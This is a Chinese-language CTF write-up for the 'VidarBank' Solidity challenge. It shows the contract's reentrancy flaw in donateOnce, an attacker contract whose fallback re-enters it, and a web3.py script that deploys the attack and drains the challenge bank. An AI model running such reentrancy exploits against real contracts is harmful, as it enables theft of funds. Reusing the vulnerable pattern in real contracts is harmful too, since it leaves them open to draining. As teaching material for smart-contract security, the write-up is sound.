# VidarBank

## 源码

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.7;

contract VidarBank {
    mapping(address => uint256) public balances; 
    mapping(address => bool) public doneDonating;
    event SendFlag();

    constructor() {}

    function newAccount() public payable{
        require(msg.value >= 0.0001 ether);
        balances[msg.sender] = 10;
        doneDonating[msg.sender] = false;
    }

    function donateOnce() public {
        require(balances[msg.sender] >= 1);
        if(doneDonating[msg.sender] == false) {
            balances[msg.sender] += 10;
            msg.sender.call{value: 0.0001 ether}("");
            doneDonating[msg.sender] = true;
        }
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }

    function isSolved() public {
         require(balances[msg.sender] >= 30, "Not yet solved!");
         emit SendFlag();
    }
}
```

## 题解

明显的重入漏洞

恶意合约

```js
contract Exp {
    VidarBank bank;
    constructor(address _bank) {
        bank = VidarBank(_bank);
    }

    function call_newAccount(uint256 amount) public payable {
        bank.newAccount{value: amount}();
    }

    function call_donateOnce() public {
        bank.donateOnce();
    }

    function call_isSolved() public {
        bank.isSolved();
    }

    fallback() external payable{
        bank.donateOnce();
    }
}
```

web3py部署调用

```python
# https://learnblockchain.cn/article/2286

from web3 import Web3, HTTPProvider
import json

web3 = Web3(HTTPProvider('http://week-2.hgame.lwsec.cn:30940/'))
print(web3.isConnected())
private_key = "xxx"
account = web3.eth.account.from_key(private_key)
print(account.address)

gas_price=5
gas_limit=500000
bank_address = web3.toChecksumAddress("0x5ebA4c687a33772e18DF90BAd65cF5b8AeA36184")
with open('exp.bin', 'r') as f:
    code = f.read()

with open('exp.abi', 'r') as f:
    abi = json.load(f)

newContract  = web3.eth.contract(abi=abi,bytecode=code) # 合约对象

construct_txn = newContract.constructor(bank_address).buildTransaction({
    'from': account.address,
    'nonce': web3.eth.getTransactionCount(account.address),
    'gas': 5000000,
    'gasPrice': web3.toWei(gas_price, 'gwei')
}) # 构造合约部署交易

signed = account.signTransaction(construct_txn) # 交易签名
tx_id = web3.eth.sendRawTransaction(signed.rawTransaction) # 交易发送
print(tx_id.hex()) # 打印交易哈希

tx_receipt = web3.eth.waitForTransactionReceipt(tx_id.hex())
print(tx_receipt.contractAddress)
# 0x1bb92c129b9A502329213ae374378d6b672f68A8

exp_address = tx_receipt.contractAddress
exp = web3.eth.contract(address=exp_address, abi=abi)
gas_price=5
gas_limit=500000

tx = exp.functions.call_newAccount(web3.toWei(0.0002, 'ether')).buildTransaction({
    "from": account.address,
    "value": web3.toWei(0.0002, 'ether'),
    'gasPrice': web3.toWei(gas_price, 'gwei'),
    "gas": gas_limit,
    "nonce": web3.eth.getTransactionCount(account.address),
})
signed_tx = account.signTransaction(tx)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction).hex()
print(tx_hash)
receipt = web3.eth.waitForTransactionReceipt(tx_hash)
print(receipt)

balance_of_bank = web3.eth.getBalance(bank_address)
print(balance_of_bank)
# 200000000000000

tx = exp.functions.call_donateOnce().buildTransaction({
    "from": account.address,
    "value": web3.toWei(0, 'ether'),
    'gasPrice': web3.toWei(gas_price, 'gwei'),
    "gas": gas_limit,
    "nonce": web3.eth.getTransactionCount(account.address),
})
signed_tx = account.signTransaction(tx)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction).hex()
print(tx_hash)

receipt = web3.eth.waitForTransactionReceipt(tx_hash)
print(receipt)

balance_of_bank = web3.eth.getBalance(bank_address)
print(balance_of_bank)

assert balance_of_bank == 0

tx = exp.functions.call_isSolved().buildTransaction({
    "from": account.address,
    "value": web3.toWei(0, 'ether'),
    'gasPrice': web3.toWei(gas_price, 'gwei'),
    "gas": gas_limit,
    "nonce": web3.eth.getTransactionCount(account.address),
})
signed_tx = account.signTransaction(tx)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction).hex()
print(tx_hash)

receipt = web3.eth.waitForTransactionReceipt(tx_hash)
print(receipt)

# txhash: 0xa5c5c3213f64423949bff36a38763b21d75cec04f3bbb2eb585a03b97169939e
```

